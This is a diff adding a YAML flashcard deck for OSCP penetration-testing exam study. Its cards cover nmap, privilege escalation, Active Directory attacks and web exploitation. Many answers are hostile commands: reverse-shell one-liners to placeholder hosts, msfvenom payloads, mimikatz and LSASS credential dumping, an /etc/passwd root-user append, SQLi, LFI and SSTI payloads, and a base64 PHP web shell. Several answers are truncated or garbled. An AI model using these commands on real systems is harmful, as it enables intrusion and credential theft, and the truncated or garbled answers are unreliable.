@@ -1,0 +1,447 @@
+title: OSCP
+description: Offensive Security Certified Professional — penetration testing methodology and techniques
+cards:
+- question: What nmap flag performs a SYN stealth scan?
+  answer: -sS
+- question: What nmap flag performs version detection on open ports?
+  answer: -sV
+- question: What nmap flag runs default NSE scripts?
+  answer: -sC
+- question: What nmap flag outputs all formats (normal, XML, grepable)?
+  answer: -oA
+- question: What nmap timing template is the most aggressive?
+  answer: -T5
+- question: What command finds all SUID binaries on a Linux system?
+  answer: find / -perm -4000 -type f 2>/dev/null
+- question: What command finds all SGID binaries on Linux?
+  answer: find / -perm -2000 -type f 2>/dev/null
+- question: What command lists all files with capability set?
+  answer: getcap -r / 2>/dev/null
+- question: What file lists sudo privileges for the current user?
+  answer: sudo -l
+- question: Where are cron jobs stored on Linux?
+  answer: /etc/crontab, /etc/cron.d/, /var/spool/cron/
+- question: What directory contains user-writable cron files on Linux?
+  answer: /var/spool/cron/crontabs/
+- question: What technique exploits diff in PATH via wildcard?
+  answer: Wildcard injection in tar/chmod/chown cron jobs
+- question: What command lists world-writable directories?
+  answer: find / -type d -perm -o+w 2>/dev/null
+- question: What is GTFOBins?
+  answer: A curated list of Unix binaries that can be exploited to bypass local security restrictions
+- question: What command exploits a writable /etc/passwd to escalate?
+  answer: openssl passwd -1 newpass; echo 'user:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd
+- question: What is the sticky bit and how to find it?
+  answer: chmod +t /tmp; find / -perm -1000 -type d 2>/dev/null
+- question: What kernel exploit family targets Linux 2.6 and 3.x?
+  answer: DirtyCow (CVE-2016-5195)
+- question: What Linux kernel exploit targets Ubuntu 16.04/18.04?
+  answer: CVE-2021-3493 (overlayfs)
+- question: What is the LXD privilege escalation technique?
+  answer: 'Add user to lxd group; mount host filesystem via Alpine image: lxc init alpine -c...'
+- question: What does chroot do?
+  answer: Changes root directory for a process, used for privilege escalation when combined with...
+- question: What Docker privilege escalation allows host root access?
+  answer: 'Mount / as volume: docker run -v /:/mnt -it alpine; chroot /mnt'
+- question: What command lists open ports on a Linux host?
+  answer: ss -tulpn or netstat -tulpn
+- question: What is the difference between staged and stageless payloads?
+  answer: Staged sends a small stager that downloads the rest; stageless contains the full payload
+- question: What msfvenom command generates a Linux reverse shell?
+  answer: msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f elf
+- question: What msfvenom command generates a Windows reverse shell?
+  answer: msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe
+- question: What encoding avoids null bytes in shellcode?
+  answer: msfvenom -p ... -e x86/shikata_ga_nai -b '\x00'
+- question: What is the difference between meterpreter and regular reverse shell?
+  answer: Meterpreter runs in memory with extended post-exploitation; regular shell is a basic cmd/bash
+- question: What is a reverse shell one-liner for bash?
+  answer: bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+- question: What Python reverse shell one-liner works across platforms?
+  answer: python -c 'import socket,subprocess,os;s=socket.socket;s.connect);os.dup2,0);os.dup2,1);os.d...
+- question: What PowerShell reverse shell one-liner?
+  answer: powershell -NoP -NonI -W Hidden -Exec Bypass -C '$c=New-Object...
+- question: What is the netcat reverse shell one-liner for Linux?
+  answer: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
+- question: What PHP reverse shell one-liner?
+  answer: php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+- question: What tool generates custom payloads with msfvenom?
+  answer: msfvenom
+- question: How do you list msfvenom payloads?
+  answer: msfvenom -l payloads
+- question: What does the msfvenom -e flag do?
+  answer: Specifies an encoder
+- question: What msfvenom output format for Windows executable?
+  answer: -f exe
+- question: What is a verbatim string in PowerShell?
+  answer: Single-quoted string that does not expand variables
+- question: What Windows command lists all services and their status?
+  answer: Get-Service or sc query
+- question: What command lists scheduled tasks on Windows?
+  answer: schtasks /query /fo LIST /v
+- question: What Windows command lists running processes?
+  answer: tasklist
+- question: What is the Windows SAM file location?
+  answer: C:\Windows\System32\config\SAM
+- question: What tool dumps Windows password hashes from SAM?
+  answer: mimikatz (sekurlsa::logonpasswords) or impacket-secretsdump
+- question: What is the SAM SYSTEM hive used for?
+  answer: To decrypt SAM hashes; both SAM and SYSTEM are needed
+- question: What reg command saves the SAM hive?
+  answer: reg save hklm\sam sam
+- question: What reg command saves the SYSTEM hive?
+  answer: reg save hklm\system system
+- question: What command dumps hashes with impacket locally?
+  answer: impacket-secretsdump -sam sam -system system LOCAL
+- question: What is the LSASS process name on Windows?
+  answer: lsass.exe
+- question: How do you dump LSASS memory with procdump?
+  answer: procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+- question: What tool extracts credentials from a LSASS minidump?
+  answer: mimikatz sekurlsa::minidump lsass.dmp; sekurlsa::logonPasswords full
+- question: What is AlwaysInstallElevated?
+  answer: A Windows policy that allows any user to install MSI files with SYSTEM privileges
+- question: What registry keys control AlwaysInstallElevated?
+  answer: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated and...
+- question: What Windows privilege involves SeImpersonatePrivilege?
+  answer: Potato attacks (JuicyPotato, RoguePotato, PrintSpoofer, GodPotato)
+- question: What is an unquoted service path vulnerability?
+  answer: When a service binary path has spaces without quotes, Windows tries multiple paths and may...
+- question: What command finds unquoted service paths?
+  answer: wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v...
+- question: What tool checks Windows weak service permissions?
+  answer: accesschk.exe, icacls, or SharpUp
+- question: What command checks service permissions with accesschk?
+  answer: accesschk.exe -uwcqv "Authenticated Users" *
+- question: What is DLL hijacking?
+  answer: Placing a malicious DLL in a directory where an application loads it due to search order
+- question: What is Windows startup folder abuse?
+  answer: Placing a malicious executable in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+- question: What command adds a user to local administrators group?
+  answer: net localgroup Administrators user /add
+- question: What is UAC bypass?
+  answer: Bypassing User Account Control to execute code as administrator without prompt
+- question: What command checks UAC level?
+  answer: REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+- question: What does fodhelper.exe UAC bypass exploit?
+  answer: UAC bypass via file association by writing to HKCU\Software\Classes\ms-settings\shell\open\c...
+- question: What is Token Impersonation?
+  answer: Using another process's access token (delegation/impersonation) to gain its privileges
+- question: What mimikatz command extracts plaintext passwords?
+  answer: sekurlsa::logonpasswords
+- question: What mimikatz command extracts Kerberos tickets?
+  answer: sekurlsa::tickets
+- question: What mimikatz command creates a golden ticket?
+  answer: 'kerberos::golden /user: /domain: /sid: /krbtgt: /id:500 /ptt'
+- question: What is a golden ticket attack?
+  answer: Forging a TGT with the KRBTGT hash to impersonate any user in the domain
+- question: What is a silver ticket attack?
+  answer: Forging a TGS ticket for a specific service using the service account's NTLM hash
+- question: What is DCSync attack?
+  answer: Replicating domain controller credentials by requesting AD replication via DRSUAPI
+- question: What user needs DCSync rights?
+  answer: Users with Replicate Directory Changes/Replicating Directory Changes All rights
+- question: What impacket tool performs DCSync?
+  answer: impacket-secretsdump -just-dc domain/user:password@target
+- question: What is Kerberoasting?
+  answer: Requesting TGS tickets for service accounts and cracking them offline
+- question: What tool requests Kerberos TGS tickets?
+  answer: GetUserSPNs.py (impacket) or Rubeus
+- question: What is the TGS ticket hash type for cracking?
+  answer: Kerberos 5 TGS-REP (hashcat mode 13100)
+- question: What is AS-REP Roasting?
+  answer: Requesting AS-REP tickets for accounts without Kerberos pre-authentication enabled
+- question: What tool performs AS-REP roasting?
+  answer: GetNPUsers.py (impacket)
+- question: What is the hashcat mode for AS-REP hashes?
+  answer: 18200 (Kerberos 5 AS-REP etype 23)
+- question: What is pass-the-hash?
+  answer: Authenticating with NTLM hash instead of plaintext password
+- question: What tool performs pass-the-hash on SMB?
+  answer: crackmapexec smb target -u user -H hash
+- question: What tool performs pass-the-hash for PTH on Windows?
+  answer: 'mimikatz sekurlsa::pth /user: /domain: /ntlm:'
+- question: What is LLMNR/NBT-NS poisoning?
+  answer: Responding to link-local multicast name resolution requests to capture NTLMv2 hashes
+- question: What is the primary tool for LLMNR poisoning?
+  answer: Responder
+- question: What Responder flag starts poisoning?
+  answer: responder -I eth0
+- question: How do you capture and relay NTLMv2 hashes?
+  answer: Responder with relay via ntlmrelayx.py (impacket)
+- question: What does ntlmrelayx.py do?
+  answer: Relays captured NTLM authentication to other servers for code execution
+- question: What is SMB relay?
+  answer: Forwarding SMB authentication from one host to another to authenticate as the user
+- question: What must be disabled for SMB relay to work?
+  answer: SMB signing on the target
+- question: What command checks SMB signing status?
+  answer: crackmapexec smb target --gen-relay-list targets.txt
+- question: What is BloodHound?
+  answer: AD attack path mapping tool that uses graph theory to find privilege escalation paths
+- question: What collects BloodHound data on Windows?
+  answer: SharpHound.exe
+- question: What collects BloodHound data on Linux?
+  answer: bloodhound-python
+- question: What Cypher query finds users with admin rights?
+  answer: MATCH p = (n) -[:AdminTo]-> (m) RETURN p
+- question: What right does GenericAll grant?
+  answer: Full control over an object (change password, add to group, etc.)
+- question: What right does WriteDACL grant?
+  answer: Ability to modify an object's ACL, potentially granting oneself more rights
+- question: What right does ForceChangePassword grant?
+  answer: Ability to change a user's password without knowing the current one
+- question: What right does AddMembers allow?
+  answer: Adding users to a security group, potentially escalating privileges
+- question: What is ACL abuse?
+  answer: Exploiting misconfigured Access Control Entries to gain additional permissions
+- question: What is RBCD (Resource-Based Constrained Delegation)?
+  answer: Allowing a service to delegate to another service based on the target's...
+- question: What tool exploits RBCD?
+  answer: Impacket rbcd.py, PowerView (Set-DomainRBCD), or BloodHound
+- question: What is AD CS abuse?
+  answer: Exploiting Active Directory Certificate Services misconfigurations (ESC1-8)
+- question: What is ESC1?
+  answer: certificate template allows requester to specify subjectAltName, enabling authentication as...
+- question: What is ESC2?
+  answer: A template has 'Any Purpose' EKU, allowing the certificate to be used for any purpose
+- question: What is ESC3?
+  answer: template enables enrollment agent; combined with another template allows requesting on...
+- question: What is ESC4?
+  answer: Low-privileged users have write access to certificate template's ACL, enabling escalation
+- question: What is ESC6?
+  answer: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA allows setting SAN on any certificate
+- question: What is ESC7?
+  answer: CA allows low-privileged user to manage CA certificates and approve pending requests
+- question: What is ESC8?
+  answer: NTLM relay to AD CS Web Enrollment endpoint for domain admin
+- question: What is certipy?
+  answer: 'Python tool for AD CS abuse: finding vulnerabilities and requesting certificates'
+- question: What certipy command finds vulnerabilities?
+  answer: certipy find -u user@domain -p password -dc-ip IP
+- question: What certipy command requests a certificate?
+  answer: certipy req -u user@domain -p password -ca CA -template Template
+- question: What is the output of certipy?
+  answer: A PFX certificate and key file
+- question: What certipy command converts PFX to usable format?
+  answer: certipy cert -pfx cert.pfx -nokey -out user.crt; openssl rsa -in cert.pfx -out key.pem
+- question: What certipy command authenticates with a PFX?
+  answer: certipy auth -pfx cert.pfx -username user -domain domain -dc-ip IP
+- question: What is the format for hashcat Kerberos TGS hashes?
+  answer: $krb5tgs$23$*user$realm$spn*$hash
+- question: What is the format for hashcat NTLM hashes?
+  answer: 'username:rid:LMHASH:NTHASH:::'
+- question: What hashcat mode cracks NTLM?
+  answer: '1000'
+- question: What hashcat mode cracks NetNTLMv2?
+  answer: '5600'
+- question: What hashcat mode cracks MD5?
+  answer: '0'
+- question: What hashcat mode cracks SHA1?
+  answer: '100'
+- question: What hashcat mode cracks bcrypt?
+  answer: '3200'
+- question: What hashcat mode cracks SHA256?
+  answer: '1400'
+- question: What tool brute-forces passwords via SSH?
+  answer: hydra -l user -P wordlist.txt ssh://target
+- question: What tool brute-forces passwords on web forms?
+  answer: hydra -l user -P wordlist.txt target http-post-form...
+- question: What tool brute-forces RDP passwords?
+  answer: hydra -l user -P wordlist.txt rdp://target
+- question: What tool brute-forces FTP passwords?
+  answer: hydra -l user -P wordlist.txt ftp://target
+- question: What tool performs password spraying against AD?
+  answer: crackmapexec smb target -u users.txt -p Password123
+- question: What crackmapexec flag sprays users against a single password?
+  answer: -p password with --continue-on-success
+- question: What tool generates a wordlist from a website?
+  answer: cewl -d 2 -m 5 -w wordlist.txt URL
+- question: What is John the Ripper used for?
+  answer: Offline password cracking for various hash types
+- question: What is the john --wordlist flag for?
+  answer: Specifies the wordlist file for dictionary attacks
+- question: What john flag enables single crack mode?
+  answer: --single
+- question: What is the john --rules flag?
+  answer: Applies word mangling rules from john.conf
+- question: What is hashcat's --attack-mode 0?
+  answer: Straight (dictionary) attack
+- question: What is hashcat's --attack-mode 3?
+  answer: Brute-force/mask attack
+- question: What is hashcat's --attack-mode 6?
+  answer: Hybrid wordlist + mask
+- question: What is hashcat's --attack-mode 7?
+  answer: Hybrid mask + wordlist
+- question: What is the rule-based attack in hashcat?
+  answer: --attack-mode 0 with -r rulefile for word mangling
+- question: What SQL injection payload dumps database names?
+  answer: ''' OR ''1''=''1'' UNION SELECT schema_name FROM information_schema.schemata --'
+- question: What SQL injection payload dumps table names?
+  answer: ''' UNION SELECT table_name FROM information_schema.tables --'
+- question: What SQL injection payload dumps column names?
+  answer: ''' UNION SELECT column_name FROM information_schema.columns WHERE table_name=''users'' --'
+- question: What does ' ORDER BY N-- do in SQLi?
+  answer: Determines number of columns for UNION injection
+- question: What is blind SQL injection?
+  answer: SQL injection where results are inferred through true/false responses or time delays
+- question: What is boolean-based blind SQLi?
+  answer: Using conditions like ' OR 1=1-- vs ' OR 1=2-- to infer data
+- question: What is time-based blind SQLi?
+  answer: Using SLEEP() or WAITFOR DELAY to infer data through response time
+- question: What SQLmap flag dumps all databases?
+  answer: sqlmap -u URL --dump --threads 10
+- question: What SQLmap flag dumps the current database?
+  answer: sqlmap -u URL --current-db --dump
+- question: What SQLmap flag gets an interactive OS shell?
+  answer: sqlmap -u URL --os-shell
+- question: What is LFI (Local File Inclusion)?
+  answer: Including local files on a server via user-controlled input, e.g., file=../../etc/passwd
+- question: What is RFI (Remote File Inclusion)?
+  answer: Including remote files on a server, allowing code execution via URL
+- question: What PHP wrapper reads files with LFI?
+  answer: php://filter/convert.base64-encode/resource=index.php
+- question: What PHP wrapper executes commands via LFI?
+  answer: php://input with POST body containing PHP code
+- question: What PHP wrapper writes a shell via LFI?
+  answer: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
+- question: What is SSTI (Server-Side Template Injection)?
+  answer: Injecting template syntax (Jinja2, Twig, Freemarker, etc.) to execute code server-side
+- question: What Jinja2 SSTI payload lists object attributes?
+  answer: '{{ ''''.__class__.__mro__[1].__subclasses__() }}'
+- question: What Jinja2 SSTI payload executes a command?
+  answer: '{{ ''''.__class__.__mro__[2].__subclasses__[40].communicate[0] }}'
+- question: What is XXE (XML External Entity)?
+  answer: Exploiting XML parsers that allow external entity injection to read files or perform SSRF
+- question: What XXE payload reads /etc/passwd?
+  answer: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM...
+- question: What is SSRF (Server-Side Request Forgery)?
+  answer: Making the server make internal requests to access internal systems
+- question: What is command injection?
+  answer: Injecting OS commands into user input that gets passed to a shell
+- question: What payload runs 'id' in command injection?
+  answer: ; id or | id or `id` or $(id)
+- question: What tool finds directory listings?
+  answer: gobuster dir -u URL -w wordlist.txt
+- question: What gobuster flag adds file extensions?
+  answer: -x php,asp,aspx,txt,html
+- question: What feroxbuster flag sets recursion depth?
+  answer: -d N or --depth N
+- question: What tool is best for fast directory brute-forcing?
+  answer: feroxbuster (Rust-based, faster than gobuster)
+- question: What ffuf flag uses recursion?
+  answer: -recursion
+- question: What ffuf flag filters response size?
+  answer: -fs SIZE
+- question: What ffuf flag filters by status code?
+  answer: -fc 404,403
+- question: What tool scans for CMS vulnerabilities?
+  answer: WPScan (WordPress), Joomscan (Joomla), Drupwn (Drupal)
+- question: What WPScan command enumerates users?
+  answer: wpscan --url URL --enumerate u
+- question: What is a buffer overflow?
+  answer: Writing more data to a buffer than allocated, overwriting adjacent memory
+- question: What is EIP in x86?
+  answer: Extended Instruction Pointer — points to next instruction to execute
+- question: What is ESP in x86?
+  answer: Extended Stack Pointer — points to top of the stack
+- question: What is the typical first step in BO exploitation?
+  answer: Find the offset to EIP using a cyclic pattern
+- question: What tool creates cyclic patterns for offset discovery?
+  answer: pattern_create.rb (Metasploit) or pwntools cyclic
+- question: What tool finds offset from crash value?
+  answer: pattern_offset.rb (Metasploit) or pwntools cyclic_find
+- question: What is a JMP ESP gadget used for?
+  answer: Redirecting execution to shellcode placed on the stack
+- question: What mona.py command finds JMP ESP gadgets?
+  answer: '!mona jmp -r esp -m module.dll'
+- question: What is NOP sled?
+  answer: A sequence of NOP (0x90) instructions to increase shellcode reliability
+- question: What is bad character analysis?
+  answer: Identifying characters that break the exploit (e.g., null bytes, newlines)
+- question: What is the typical bad char list for buffer overflows?
+  answer: \x00 (null byte) and sometimes \x0a (LF), \x0d (CR)
+- question: What immunity debugger command finds a memory address?
+  answer: '!mona modules or !mona find -s ''\xff\xe4'' -m module'
+- question: What is SEH overwrite?
+  answer: Overwriting the Structured Exception Handler to redirect execution on exception
+- question: What mona command generates SEH exploit?
+  answer: '!mona seh'
+- question: What is SafeSEH bypass?
+  answer: Using a module not compiled with SafeSEH or using a registered handler
+- question: What is SEHOP bypass?
+  answer: Bypassing SEHOP by overwriting the handler chain pointer
+- question: What is ROP (Return-Oriented Programming)?
+  answer: Chaining short instruction sequences (gadgets) ending in ret to execute arbitrary code
+- question: What is a ROP gadget?
+  answer: A sequence of instructions ending in ret (0xc3) used in ROP chains
+- question: What is a stack pivot?
+  answer: Moving the stack pointer to a controlled memory area (e.g., xchg eax, esp; ret)
+- question: Why is ROP needed?
+  answer: To bypass DEP/NX which prevents executing shellcode on the stack/heap
+- question: What function is commonly used in ROP to bypass DEP?
+  answer: VirtualProtect (Windows) or mprotect (Linux)
+- question: What is ASLR?
+  answer: Address Space Layout Randomization — randomizes memory addresses to prevent exploits
+- question: What is a bypass for ASLR?
+  answer: Using modules without ASLR (non-ASLR modules), partial overwrite, or brute-force
+- question: What is a non-ASLR module?
+  answer: A DLL/exe not compiled with /DYNAMICBASE — addresses are predictable
+- question: What is an egghunter?
+  answer: Shellcode that searches process memory for a tag followed by the actual payload
+- question: When is an egghunter used?
+  answer: When buffer space is too small to hold the full payload
+- question: What is the chisel command for reverse SOCKS tunnel?
+  answer: chisel client SERVER:PORT R:socks
+- question: What chisel command starts the server?
+  answer: chisel server -p PORT --reverse
+- question: What is ligolo-ng?
+  answer: A tunneling/pivoting tool that creates a virtual network interface for proxying
+- question: What does sshuttle do?
+  answer: Creates a transparent VPN-like tunnel over SSH for pivoting
+- question: What sshuttle command routes traffic through a jump host?
+  answer: sshuttle -r user@target 10.0.0.0/8
+- question: What is proxychains?
+  answer: Forces any TCP connection through proxy servers
+- question: What is the default proxychains config file?
+  answer: /etc/proxychains.conf
+- question: What tool creates local port forwards?
+  answer: socat, ssh -L, chisel, or netsh
+- question: What socat command forwards a local port to a remote host?
+  answer: socat TCP-LISTEN:LOCAL_PORT,fork TCP:REMOTE_HOST:REMOTE_PORT
+- question: What Windows command adds a firewall rule to allow a port?
+  answer: netsh advfirewall firewall add rule name="Open Port" dir=in action=allow protocol=TCP...
+- question: What command connects to a Windows target via WinRM?
+  answer: evil-winrm -i IP -u user -p password
+- question: What impacket tool executes commands via SMB?
+  answer: impacket-psexec domain/user:password@target
+- question: What impacket tool executes commands via WMI?
+  answer: impacket-wmiexec domain/user:password@target
+- question: What port does SMB use?
+  answer: 445 (TCP)
+- question: What port does WinRM use?
+  answer: 5985 (HTTP) or 5986 (HTTPS)
+- question: What port does RDP use?
+  answer: 3389 (TCP)
+- question: What port does LDAP use?
+  answer: 389 (TCP) or 636 (LDAPS)
+- question: What port does Kerberos use?
+  answer: 88 (TCP/UDP)
+- question: What port does DNS use?
+  answer: 53 (TCP/UDP)
+- question: What port does HTTP use?
+  answer: 80 (TCP)
+- question: What port does HTTPS use?
+  answer: 443 (TCP)
+- question: What port does MySQL use?
+  answer: 3306 (TCP)
+- question: What port does MSSQL use?
+  answer: 1433 (TCP)
+- question: What port does SSH use?
+  answer: 22 (TCP)
+- question: What port does FTP use?
+  answer: 21 (TCP)
+- question: What is the correct order of PTES methodology?
+  answer: 1. Pre-engagement, 2. Intelligence Gathering, 3. Threat Modeling, 4. Vulnerability...
+- question: What should a pentest report include?
+  answer: Executive summary, scope, methodology, findings with risk ratings, PoC, remediation...
